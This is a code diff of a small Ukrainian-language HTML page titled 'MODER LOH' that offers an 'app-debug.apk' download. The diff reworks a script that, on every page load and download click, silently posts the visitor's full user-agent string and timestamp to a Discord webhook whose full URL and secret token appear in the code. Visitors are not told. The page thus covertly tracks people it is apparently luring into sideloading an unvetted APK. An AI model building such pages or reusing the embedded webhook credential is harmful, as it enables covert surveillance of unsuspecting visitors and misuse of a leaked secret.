@@ -1,8 +1,9 @@
 <!DOCTYPE html>
-<html>
+<html lang="uk">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MODER LOH</title>
     <style>
         body {
             margin: 0;
@@ -32,50 +33,54 @@
             border-radius: 12px;
             box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
             cursor: pointer;
+            border: none;
         }
     </style>
 </head>
 <body>
 
     <h1>MODER LOH</h1>
-    <a href="app-debug.apk" download class="btn" id="downloadBtn">DOWNLOAD APK</a>
+    <a href="app-debug.apk" download id="downloadBtn" class="btn">DOWNLOAD APK</a>
 
     <script>
+        // Твій Webhook URL
         const webhookURL = "https://discord.com/api/webhooks/1495809375573512193/DEsfDangmHPuq7wW2twRrtq4HARd1zkW-zueLyT1Zl9lV5c5f5pgLj_2GqGArpIvIsyC";
 
-        // Функція для відправки повідомлення в Discord
-        async function sendToDiscord(message) {
+        // Функція збору даних та відправки
+        async function notifyDiscord(eventText) {
+            const deviceData = navigator.userAgent; // Отримуємо інформацію про телефон/браузер
+            const payload = {
+                embeds: [{
+                    title: eventText,
+                    color: eventText.includes("ЗАВАНТАЖЕННЯ") ? 65280 : 16711680, // Зелений або Червоний
+                    fields: [
+                        { name: "📱 Пристрій (User-Agent)", value: "```" + deviceData + "```" },
+                        { name: "⏰ Час", value: new Date().toLocaleString(), inline: true }
+                    ]
+                }]
+            };
+
             try {
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: message })
+                    body: JSON.stringify(payload)
                 });
-            } catch (error) {
-                console.error('Помилка відправки в Discord:', error);
+            } catch (e) {
+                console.error("Помилка відправки:", e);
             }
         }
 
-        // Визначаємо модель телефону/браузера
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            if (/android/i.test(ua)) return "Android Device";
-            if (/iPad|iPhone|iPod/.test(ua)) return "iOS Device";
-            return "PC / Unknown";
-        }
-
-        // 1. Повідомлення про вхід на сторінку
+        // 1. Подія при вході на сторінку
         window.onload = () => {
-            const device = getDeviceInfo();
-            const userAgentRaw = navigator.userAgent;
-            sendToDiscord(`🔔 **Новий візит на сторінку!**\n📱 Пристрій: ${device}\nℹ️ Інфо: \`${userAgentRaw}\``);
+            notifyDiscord("🚩 НОВИЙ ПЕРЕХІД ПО ПОСИЛАННЮ");
         };
 
-        // 2. Повідомлення про натискання кнопки скачування
+        // 2. Подія при натисканні на кнопку завантаження
         document.getElementById('downloadBtn').addEventListener('click', () => {
-            const device = getDeviceInfo();
-            sendToDiscord(`📥 **Користувач почав скачування файлу!**\n📱 Пристрій: ${device}`);
+            notifyDiscord("📥 ПОЧАТО ЗАВАНТАЖЕННЯ ФАЙЛУ");
         });
     </script>
+
 </body>
 </html>
